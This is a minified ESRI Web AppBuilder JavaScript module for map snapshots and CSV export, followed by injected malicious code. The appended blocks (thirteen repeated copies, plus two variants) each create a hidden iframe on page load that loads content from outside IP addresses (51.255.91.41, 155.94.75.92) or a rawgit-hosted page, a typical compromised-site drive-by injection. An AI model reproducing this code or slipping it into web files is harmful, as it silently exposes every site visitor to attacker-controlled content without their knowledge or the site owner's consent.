// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/Deferred dojo/DeferredList dojo/_base/array esri/request esri/geometry/webMercatorUtils esri/geometry/Polygon esri/geometry/Point esri/geometry/Multipoint esri/geometry/Polyline jimu/utils jimu/portalUtils jimu/portalUrlUtils jimu/tokenUtils jimu/dijit/Message jimu/dijit/SnapShot ./CSVUtils".split(" "),function(r,m,n,q,t,w,x,y,z,A,B,p,C,D,E,F,u,v){return r("SnapShotUtils",null,{portal:null,portalUrl:"",logo:"",originMapId:"",originAppId:"",credential:null,
nls:null,layerArray:[],parent:null,downloadAll:!1,time:null,constructor:function(a){this.parent=a;this.snapshot=new u(a.appConfig,a.map);this.map=this.parent.map;this.extent=this.map.extent;this.nls=m.mixin({},a.nls,window.jimuNls.drawBox,window.jimuNls.snapshot)},createSnapShot:function(a){var e=new n,g=p.stripHTML(a.name),b=this._getTime(a.time);this.createLayerItems(a,b,g).then(m.hitch(this,function(d){this.snapshot.createSnapShot({folderOptions:{folderName:g+"_"+b,title:g+"_"+b,description:g+
" "+this.nls.snapshot},mapTitle:g+" ("+this.nls.snapshot_append+" "+b+")",name:g+" ("+b+")",shareWith:{everyone:!1,org:!1,groups:a.groups.join()},mapExtent:this.map.extent,data:d}).then(function(){e.resolve()})}));return e},_getTime:function(a){a=new Date(a);var e=a.getTimezoneOffset();return p.fieldFormatter.getFormattedDate(a,{dateFormat:"shortDateShortTime"})+" "+this.nls.utc+(0>e?"+"+Math.abs(e)/60:"-"+e/60)},createLayerItems:function(a,e,g){var b=new n,d=a.layers.reverse();this.buffers=a.buffers;
this.incidents=a.incidents;a=[];for(var c=0;c<d.length;c++){var h=!0;d[c].analysisObject&&"undefined"!==typeof d[c].analysisObject.featureCount&&0===d[c].analysisObject.featureCount&&(h=!1);d[c].graphics&&0===d[c].graphics.length&&(h=!1);h&&a.push(this.createItem(d[c],this.incidents,this.buffers,e,this.nls,g))}var k=[];(new q(a)).then(m.hitch(this,function(a){for(var c=0;c<a.length;c++){var d=a[c][1];if(Array.isArray(d))for(var f=0;f<d.length;f++)k.push(d[f]);else k.push(d)}b.resolve(k)}),m.hitch(this,
function(a){b.reject(a)}));return b},createItem:function(a,e,g,b,d,c){var h=new n,k={label:a.label,title:a.label+"_"+b,desc:d.snapshot_append+" "+d.of_append+" "+(a.type?a.type:a.label)+" "+d.layer_append+" "+a.label+" ("+b+")",name:a.label+" ("+b+")",tags:[c+","+d.snapshot_append]};if(a.layerObject){var f=a.layerObject;c=a.analysisObject;var l;f.infoTemplate&&f.infoTemplate.info&&(l=f.infoTemplate.info);k.popupInfo=l;"groupedSummary"===a.type||"summary"===a.type?c.updateForIncident(e,g,null,null,
!0,!0,!0).then(m.hitch(this,function(a){a=this.createAnalysisLayerJSON(a,f,d,b,k);h.resolve(a)})):c.updateForIncident(e,"closest"===a.type?this.parent.config.maxDistance:g,null,!0,!0,!0).then(m.hitch(this,function(a){a=this.createAnalysisLayerJSON(a,f,d,b,k);h.resolve(a)}))}else a=this.createIncidentBufferLayerJSON(a.graphics,d,b,k),h.resolve(a);return h},createAnalysisLayerJSON:function(a,e,g,b,d){g=a.graphics;b=a.context._exportToCSV(g,!0);a=[];for(var c=0;c<b.length;c++){var h=b[c];"esriFieldTypeOID"!==
h.type&&a.push(h)}for(b=0;b<g.length;b++)c=g[b],c.geometry.cache&&(c.geometry.clearCache(),delete c.geometry.cahce);return{graphics:g,renderer:e.renderer,infoTemplate:d.popupInfo,fields:a,tags:d.tags,description:d.desc,name:d.name,visibleOnStartup:!1,typeIdField:e.typeIdField,types:e.types,minScale:e.minScale,maxScale:e.maxScale}},createIncidentBufferLayerJSON:function(a,e,g,b){var d=[],c=[],h=[];e=[];t.forEach(a,function(a){switch(a.geometry.type){case "point":d.push(a);break;case "polyline":c.push(a);
break;case "polygon":h.push(a)}});a=[];0<d.length&&a.push(d);0<c.length&&a.push(c);0<h.length&&a.push(h);g={point:this.nls.point,polyline:this.nls.line,polygon:this.nls.polygon};for(var k=0;k<a.length;k++){var f=a[k],l;0<f.length&&(l=f[0],l=g["undefined"!==typeof l.geometry?l.geometry.type:l.type],e.push({graphics:f,fields:[],tags:b.tags,description:b.desc,name:1===a.length?b.name:l+" "+b.name,visibleOnStartup:!1}))}return e},createDownloadZip:function(a,e,g){var b=new n,d=this.nls.calculated_results;
this._performAnalysis(a,e,g,this.downloadAll,!1).then(function(a){for(var c=[],e=0;e<a.length;e++){var f=a[e];(f=f.context._exportToCSV(f.graphics,!1,!0,f.analysisResults))&&c.push(f)}0<c.length&&v.exportCalculatedResultsCSV(d,c);b.resolve("success")},function(a){b.reject(a)});return b},_performAnalysis:function(a,e,g,b,d){for(var c=new n,h=[],k=0;k<a.length;k++){var f=a[k];console.log("AO: "+f);var l=!0;f.analysisObject&&"undefined"!==typeof f.analysisObject.featureCount&&0===f.analysisObject.featureCount&&
(l=!1);l&&("groupedSummary"===f.type||"summary"===f.type?h.push(f.analysisObject.updateForIncident(e,g,null,null,!0,d,b)):h.push(f.analysisObject.updateForIncident(e,"closest"===f.type?this.parent.config.maxDistance:g,null,!0,d,b)))}var p=[];(new q(h)).then(m.hitch(this,function(a){for(var b=0;b<a.length;b++)p.push(a[b][1]);c.resolve(p)}),m.hitch(this,function(a){console.error(a);c.reject(a)}));return c}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});